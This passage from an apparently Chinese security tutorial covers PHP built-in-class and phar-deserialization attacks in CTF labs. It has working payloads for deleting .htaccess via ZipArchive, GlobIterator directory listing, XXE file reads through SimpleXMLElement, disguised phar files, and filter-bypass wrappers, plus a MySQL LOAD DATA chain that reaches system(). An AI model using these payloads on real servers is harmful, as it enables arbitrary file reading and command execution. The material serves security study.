<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Upload</span></span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span></span>)</span>&#123;
        <span class="hljs-comment">//这是一个你不能修改的文件, prprprpr</span>
    &#125;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span></span>)</span>&#123;
        <span class="hljs-comment">//你还是不能修改, lololololol</span>
    &#125;
&#125;</code></pre></div>



<p>这个上传类被.htaccess文件控制的很死，难以上传我们的小马，即使成功上传了，也不能执行，只有删除了.htaccess文件才可以，那么我们要怎么利用呢<br>所以我们现在就是要先找到一个函数，能删除或者覆盖掉.htaccess文件，先搜索一波</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">foreach</span> (get_declared_classes() <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>)&#123;
    <span class="hljs-keyword">foreach</span> (get_class_methods(<span class="hljs-variable">$class</span>)  <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>)&#123;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$method</span> == <span class="hljs-string">&quot;open&quot;</span>)&#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$class</span> -&gt; <span class="hljs-subst">$method</span>&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
        &#125;
    &#125;
&#125;</code></pre></div>



<p>这里搜索到三个函数</p>
<div class="hljs code-wrapper"><pre><code class="hljs php">SessionHandler -&gt; open
ZipArchive -&gt; open
XMLReader -&gt; open</code></pre></div>



<p><code>ZipArchive::open</code></p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/13.png"></p>
<p>可以看到<code>flag</code>参数有个<code>ZipArchive::OVERWRITE</code>模式，继续找它的官方介绍能看到</p>
<div class="hljs code-wrapper"><pre><code class="hljs lasso">ZIPARCHIVE<span class="hljs-type">::OVERWRITE</span> (<span class="hljs-built_in">integer</span>)
总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖。</code></pre></div>



<p>我们先测试一下<br><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/14.png" alt="img"><br>可以看到确实成功的删除了文件，因此我们就可以达到了删除固定文件的目的，也就摆脱了.htaccess文件的限制了</p>
<h4 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4><h3 id="GlobIterator：目录枚举"><a href="#GlobIterator：目录枚举" class="headerlink" title="GlobIterator：目录枚举"></a>GlobIterator：目录枚举</h3><p>危害：</p>
<ul>
<li>可以达到目录遍历的效果</li>
</ul>
<h4 id="例子：红日代码审计day3-ctf题"><a href="#例子：红日代码审计day3-ctf题" class="headerlink" title="例子：红日代码审计day3 ctf题"></a>例子：红日代码审计day3 ctf题</h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotFound</span></span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;404&#x27;</span>);
    &#125;
&#125;
spl_autoload_register(
    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;
        <span class="hljs-keyword">new</span> NotFound();
    &#125;
);
<span class="hljs-variable">$classname</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-variable">$param</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-variable">$param2</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(class_exists(<span class="hljs-variable">$classname</span>))&#123;
    <span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$classname</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$param2</span>);
    var_dump(<span class="hljs-variable">$newclass</span>);
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$newclass</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&gt;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;
&#125;</code></pre></div>



<p><strong>The GlobIterator class</strong></p>
<p>(PHP 5 &gt;= 5.3.0, PHP 7)</p>
<p>遍历一个文件系统行为类似于 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.glob.php">glob()</a>.</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-built_in">GlobIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">FilesystemIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">SeekableIterator</span> , <span class="hljs-built_in">Countable</span> &#123;
<span class="hljs-comment">/* 方法 */</span>
<span class="hljs-keyword">public</span> __construct ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-built_in">FilesystemIterator</span>::KEY_AS_PATHNAME | <span class="hljs-built_in">FilesystemIterator</span>::CURRENT_AS_FILEINFO ] )
<span class="hljs-keyword">public</span> count ( <span class="hljs-keyword">void</span> ) : <span class="hljs-keyword">int</span>
<span class="hljs-comment">/* 继承的方法 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::__construct ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-built_in">FilesystemIterator</span>::KEY_AS_PATHNAME | <span class="hljs-built_in">FilesystemIterator</span>::CURRENT_AS_FILEINFO | <span class="hljs-built_in">FilesystemIterator</span>::SKIP_DOTS ] )
<span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::current ( <span class="hljs-keyword">void</span> ) : mixed
<span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::getFlags ( <span class="hljs-keyword">void</span> ) : <span class="hljs-keyword">int</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::key ( <span class="hljs-keyword">void</span> ) : <span class="hljs-keyword">string</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::next ( <span class="hljs-keyword">void</span> ) : <span class="hljs-keyword">void</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::rewind ( <span class="hljs-keyword">void</span> ) : <span class="hljs-keyword">void</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::setFlags ([ <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> ] ) : <span class="hljs-keyword">void</span>
&#125;</code></pre></div>



<p>主要关注GlobIterator的__construct方法</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">GlobIterator</span>::__construct ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-built_in">FilesystemIterator</span>::KEY_AS_PATHNAME | <span class="hljs-built_in">FilesystemIterator</span>::CURRENT_AS_FILEINFO ] )</code></pre></div>



<p>这里用到CURRENT_AS_FILEINFO，其值为0.<code>const integer CURRENT_AS_FILEINFO = 0 ;</code></p>
<p>payload：</p>
<p><code>http://127.0.0.1/PHP-Audit-Labs/day/day3/CTF/?name=GlobIterator&amp;param=./*.php&amp;param2=0</code></p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200829095823083.png" alt="image-20200829095823083"></p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200829100518237.png" alt="image-20200829100518237"></p>
<p>可以看到使用glob协议访问目录</p>
<p>我们将会发现flag的文件名为 <strong>f1agi3hEre.php</strong> ，接下来我们使用内置类 <strong>SimpleXMLElement</strong> 读取 <strong>f1agi3hEre.php</strong> 文件的内容。</p>
<h3 id="SimpleXMLElement：XXE"><a href="#SimpleXMLElement：XXE" class="headerlink" title="SimpleXMLElement：XXE"></a>SimpleXMLElement：XXE</h3><p>此类是PHP SimpleXML扩展的一部分，该扩展可在大多数PHP安装中使用。实例化的对象时<code>SimpleXMLElement</code>，传递给其构造函数的数据将解析为XML</p>
<p>利用条件：</p>
<ul>
<li>xmllib库为存在漏洞的版本</li>
<li>有实例化对象的点即可</li>
</ul>
<p>危害（xxe）：</p>
<ul>
<li>任意文件读取</li>
<li>SSRF</li>
</ul>
<div class="hljs code-wrapper"><pre><code class="hljs php">SimpleXMLElement::__construct ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$data</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$options</span> = <span class="hljs-number">0</span> [, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$data_is_url</span> = <span class="hljs-literal">false</span> [, <span class="hljs-keyword">string</span> <span class="hljs-variable">$ns</span> = <span class="hljs-string">&quot;&quot;</span> [, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$is_prefix</span> = <span class="hljs-literal">false</span> ]]]] )</code></pre></div>







<h4 id="例子：红日代码审计day3-ctf题-1"><a href="#例子：红日代码审计day3-ctf题-1" class="headerlink" title="例子：红日代码审计day3 ctf题"></a>例子：红日代码审计day3 ctf题</h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotFound</span></span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;404&#x27;</span>);
    &#125;
&#125;
spl_autoload_register(
    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;
        <span class="hljs-keyword">new</span> NotFound();
    &#125;
);
<span class="hljs-variable">$classname</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-variable">$param</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-variable">$param2</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(class_exists(<span class="hljs-variable">$classname</span>))&#123;
    <span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$classname</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$param2</span>);
    var_dump(<span class="hljs-variable">$newclass</span>);
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$newclass</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&gt;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;
&#125;</code></pre></div>



<p>实例化类的类名和传入类的参数均在用户的控制之下。攻击者可以通过该漏洞，调用PHP代码库的任意构造函数。即使代码本身不包含易受攻击的构造函数，我们也可以使用PHP的内置类 <strong>SimpleXMLElement</strong> 来进行 <strong>XXE</strong> 攻击，进而读取目标文件的内容，甚至命令执行（前提是安装了PHP拓展插件expect），我们来看一下PHP手册对 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/simplexmlelement.construct.php"><strong>SimpleXMLElement</strong></a> 类的定义：</p>
<p><img src="https://miro.medium.com/max/1312/1*H6rj5C6Z7hz9FchcNC3mZw.png" alt="Image for post"></p>
<p>我们将会发现flag的文件名为 <strong>f1agi3hEre.php</strong> ，接下来我们使用内置类 <strong>SimpleXMLElement</strong> 读取 <strong>f1agi3hEre.php</strong> 文件的内容,，这里我们要结合使用PHP流的使用，因为当文件中存在： <strong>&lt; &gt; &amp; ‘ “</strong> 这5个符号时，会导致XML文件解析错误，所以我们这里利用PHP文件流，将要读取的文件内容经过 <strong>base64编码</strong> 后输出即可，具体payload如下：</p>
<p>windows</p>
<div class="hljs code-wrapper"><pre><code class="hljs url">?name&#x3D;SimpleXMLElement&amp;para&#x3D;?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;D:\phpStudy\PHPTutorial\WWW\PSC2017\snowflake\f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;&amp;param2&#x3D;2</code></pre></div>



<p><strong>linux</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs url">http:&#x2F;&#x2F;localhost&#x2F;CTF&#x2F;index.php?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;CTF&#x2F;f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;&amp;param2&#x3D;2</code></pre></div>

<p>第二个参数实际上这里2对应的模式是 <strong>LIBXML_NOENT</strong>，因为在libxml&gt;=2.9.0以后的版本默认不开启外部实体解析，需要添加这个参数开启。</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200829103309104.png" alt="image-20200829103309104"></p>
<h2 id="0x07-php反序列化扩展phar"><a href="#0x07-php反序列化扩展phar" class="headerlink" title="0x07 php反序列化扩展phar"></a>0x07 php反序列化扩展phar</h2><h3 id="基本概念和常见利用方法"><a href="#基本概念和常见利用方法" class="headerlink" title="基本概念和常见利用方法"></a>基本概念和常见利用方法</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>Phar（PHP Archive）文件是一种打包格式，将PHP代码文件和其他资源放入一个文件中来实现应用程序和库的分发。</p>
<p>在来自Secarma的安全研究员Sam Thomas在18年的Black Hat上提出后利用方式后，开始受到广泛的关注。</p>
<p>Phar可利用是因为Phar以序列化的形式存储用户自定义的meta-data，而以流的形式打开的时候，会自动反序列化，从而触发对应的攻击载荷。</p>
<h4 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h4><p>Phar由四个部分组成，分别是 <code>stub</code> / <code>manifest</code> / 文件内容 / 签名。 stub 需要 <code>__HALT_COMPILER();</code> 这个调用在PHP代码中。</p>
<p>manifest 包含压缩文件的权限、属性、序列化形式存储的meta-data等信息，这是攻击的核心部分，主要就是解析Phar时对meta-data的反序列化。</p>
<p>phar的实现在 <code>php-src/ext/phar/phar.c</code> 中，主要是 <code>phar_parse_metadata</code> 函数在解析phar文件时调用了 <code>php_var_unserialize</code> ，因而造成问题。</p>
<p>而php在文件流处理过程中会调用 <code>_php_stream_stat_path</code> (/main/streams/streams.c) ，而后间接调用 <code>phar_wrapper_stat</code> ，所以大量的文件操作函数都可以触发phar的反序列问题。</p>
<p>目前已知部分的触发函数有:</p>
<div class="hljs code-wrapper"><pre><code class="hljs gradle">fileatime <span class="hljs-regexp">/ filectime /</span> filemtime <span class="hljs-regexp">/stat /</span> fileinode <span class="hljs-regexp">/ fileowner /</span> filegroup <span class="hljs-regexp">/ fileperms /</span> <span class="hljs-keyword">file</span> <span class="hljs-regexp">/ file_get_contents /</span> readfile <span class="hljs-regexp">/ fopen /</span> file_exists <span class="hljs-regexp">/ is_dir /</span> is_executable <span class="hljs-regexp">/ is_file /</span> is_link <span class="hljs-regexp">/ is_readable /</span> is_writeable <span class="hljs-regexp">/ is_writable /</span> parse_ini_file <span class="hljs-regexp">/ unlink /</span> <span class="hljs-keyword">copy</span> <span class="hljs-regexp">/ exif_thumbnail /</span> exif_imagetype <span class="hljs-regexp">/ imageloadfont /</span> imagecreatefrom <span class="hljs-regexp">/ hash_hmac_file /</span> hash_file <span class="hljs-regexp">/ hash_update_file /</span> md5_file <span class="hljs-regexp">/ sha1_file /</span> get_meta_tags <span class="hljs-regexp">/ get_headers /</span> getimagesize <span class="hljs-regexp">/ getimagesizefromstring /</span>ZipArchive-&gt;extractTo /finfo_file</code></pre></div>

<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20200226153548.png" alt="img"></p>
<h4 id="生成phar"><a href="#生成phar" class="headerlink" title="生成phar"></a>生成phar</h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;
    &#125;
    <span class="hljs-comment">// 生成phar 文件的格式</span>
    @unlink(<span class="hljs-string">&quot;phar.phar&quot;</span>);
    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> TestObject();
    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span>
    <span class="hljs-variable">$phar</span>-&gt;startBuffering();
    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span>
    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span>
    <span class="hljs-comment">//签名自动计算</span>
    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>注意：</p>
<ul>
<li><p>要将php.ini中的**<code>phar.readonly</code>选项设置为Off**，否则无法生成phar文件。</p>
</li>
<li><p>生成时必须设置为phar后缀，生成后可以改后缀进行上传。</p>
</li>
</ul>
<h4 id="伪造phar-文件为其他格式"><a href="#伪造phar-文件为其他格式" class="headerlink" title="伪造phar 文件为其他格式"></a>伪造phar 文件为其他格式</h4><p>只需要改 文件头 stub即可,php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;GIF89a&quot;</span> . <span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</code></pre></div>



<p>例如SUCTF2019 uploads 2 中<code>$phar-&gt;setStub(&quot;GIF89a&lt; ?php __HALT_COMPILER(); ?&gt;&quot;);</code>  </p>
<p>&lt;和？中间加了一个空格绕过了Check类的check检查，这个修改对phar文件没有影响</p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>phar 文件能够上传</li>
<li>文件操作函数参数可控, <code>:</code> ,<code>/</code> <code>phar</code> 等特殊字符没有被过滤</li>
<li>有可用的魔术方法作为”跳板”</li>
</ul>
<h4 id="bypass-phar-不能出现在首部"><a href="#bypass-phar-不能出现在首部" class="headerlink" title="bypass phar:// 不能出现在首部"></a>bypass phar:// 不能出现在首部</h4><p>这时候我们可以利用<code>compress.zlib://</code> 或<code>compress.bzip2://</code>函数,<code>compress.zlib://</code>和<code>compress.bzip2://</code>同样适用于<code>phar://</code>。</p>
<p>payload: <code>compress.zlib://phar://phar.phar/test.txt</code></p>
<p><strong>ctf题中出现的一些过滤：</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Go away!&quot;</span>);
    &#125;</code></pre></div>

<p>这里过滤了phar协议，但是可以使用php://filter协议进行绕过</p>
<p><code>php://filter/resource=phar://upload/46c01c941bd10a9c3038752f7354f2e8/b1b288ddc6069e3befa40731e382b192.jpeg</code></p>
<p>也可以使用zip或者bzip2协议绕过</p>
<div class="hljs code-wrapper"><pre><code class="hljs javascript">demo.php?filename=compress.bzip2:<span class="hljs-comment">//phar://upload_file/shell.gif/a</span></code></pre></div>





<h4 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> PDO(sprintf(<span class="hljs-string">&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;</span>, <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;postgres&quot;</span>, <span class="hljs-string">&quot;sx&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>));
<span class="hljs-variable">$pdo</span>-&gt;pgsqlCopyFromFile(<span class="hljs-string">&#x27;aa&#x27;</span>, <span class="hljs-string">&#x27;phar://test.phar/aa&#x27;</span>);</code></pre></div>

<p>pgsqlCopyToFile和pg_trace同样也是能使用的，只是它们需要开启phar的写功能</p>
<h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper.</p>
<p>但是需要修改mysqld配置,因为不是默认配置</p>
<div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span>
<span class="hljs-attr">local-infile</span>=<span class="hljs-number">1</span>
<span class="hljs-attr">secure_file_priv</span>=<span class="hljs-string">&quot;&quot;</span></code></pre></div>



<p>例如如下代码：</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123; 
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span> = <span class="hljs-string">&#x27;&#x27;</span>; 
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span> (<span class="hljs-params"></span>) </span>&#123;
        system(<span class="hljs-keyword">$this</span>-&gt;s);
    &#125;   
&#125;
<span class="hljs-variable">$m</span> = mysqli_init();
mysqli_options(<span class="hljs-variable">$m</span>, MYSQLI_OPT_LOCAL_INFILE, <span class="hljs-literal">true</span>);
<span class="hljs-variable">$s</span> = mysqli_real_connect(<span class="hljs-variable">$m</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;mesboard&#x27;</span>, <span class="hljs-number">3306</span>);
<span class="hljs-variable">$p</span> = mysqli_query(<span class="hljs-variable">$m</span>, <span class="hljs-string">&#x27;LOAD DATA LOCAL INFILE \&#x27;phar://test.phar/aaa\&#x27; INTO TABLE users  LINES TERMINATED BY \&#x27;\r\n\&#x27;  IGNORE 1 LINES;&#x27;</span>);</code></pre></div>



<p><code>makphar.php</code>:</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>=<span class="hljs-string">&#x27;ls&#x27;</span>;
&#125;

@unlink(<span class="hljs-string">&#x27;test.phar&#x27;</span>);
<span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;test.phar&#x27;</span>);
<span class="hljs-variable">$phar</span>-&gt;startBuffering();
<span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);
<span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);
<span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> A();
<span class="hljs-variable">$phar</span>-&gt;setMetaData(<span class="hljs-variable">$o</span>);
<span class="hljs-variable">$phar</span>-&gt;stopBuffering();

<span class="hljs-meta">?&gt;</span></code></pre></div>



<p><code>php5.6</code>下：</p>
<p><a target="_blank" rel="noopener" href="https://www.github.com/coomrade/Img/raw/master/pics/1540438957427.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1540438957427.png" alt="enter description here"></a></p>
<p>php7.0`:</p>
<p><a target="_blank" rel="noopener" href="https://www.github.com/coomrade/Img/raw/master/pics/1540439032065.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1540439032065.png" alt="enter description here"></a></p>
<p>只需要目标表是存在的就可以了，并没有其他要求，唯一可惜的就是不是默认配置</p>
<h3 id="例题：SUCTF-2019-uploads-2"><a href="#例题：SUCTF-2019-uploads-2" class="headerlink" title="例题：SUCTF 2019 uploads 2"></a>例题：SUCTF 2019 uploads 2</h3><p>题目源码：</p>
<p>class.php</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ad</span></span>&#123;

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$clazz</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func1</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func2</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func3</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$instance</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg1</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg2</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg3</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$clazz</span>, <span class="hljs-variable">$func1</span>, <span class="hljs-variable">$func2</span>, <span class="hljs-variable">$func3</span>, <span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span>, <span class="hljs-variable">$arg3</span></span>)</span>&#123;

        <span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-variable">$cmd</span>;

        <span class="hljs-keyword">$this</span>-&gt;clazz = <span class="hljs-variable">$clazz</span>;
        <span class="hljs-keyword">$this</span>-&gt;func1 = <span class="hljs-variable">$func1</span>;
        <span class="hljs-keyword">$this</span>-&gt;func2 = <span class="hljs-variable">$func2</span>;
        <span class="hljs-keyword">$this</span>-&gt;func3 = <span class="hljs-variable">$func3</span>;
        <span class="hljs-keyword">$this</span>-&gt;arg1 = <span class="hljs-variable">$arg1</span>;
        <span class="hljs-keyword">$this</span>-&gt;arg2 = <span class="hljs-variable">$arg2</span>;
        <span class="hljs-keyword">$this</span>-&gt;arg3 = <span class="hljs-variable">$arg3</span>;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;

